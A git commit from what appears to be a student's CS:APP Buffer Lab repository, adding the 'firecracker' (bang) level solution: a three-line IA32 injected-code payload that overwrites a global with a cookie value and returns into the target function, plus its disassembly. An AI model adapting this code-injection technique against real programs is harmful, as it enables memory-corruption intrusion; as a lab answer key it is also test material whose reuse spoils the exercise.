e22fc06d861908dfaad7da598867e426b344f150
codeNoobYu <1371916369@qq.com>
2024-05-16 01:10:00 +0800

    finish firecracker

---
+++ BufferLab(IA32)/buflab-handout/asmbang.s
@@ -0,0 +1,3 @@
+movl   $0x1e991d32,0x804d100
+push   $0x08048c9d
+ret
---
+++ BufferLab(IA32)/buflab-handout/bang.asm
@@ -0,0 +1,11 @@
+
+asmbang.o:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+00000000 <.text>:
+   0:	c7 05 00 d1 04 08 32 	movl   $0x1e991d32,0x804d100
+   7:	1d 99 1e 
+   a:	68 9d 8c 04 08       	push   $0x8048c9d
+   f:	c3                   	ret    
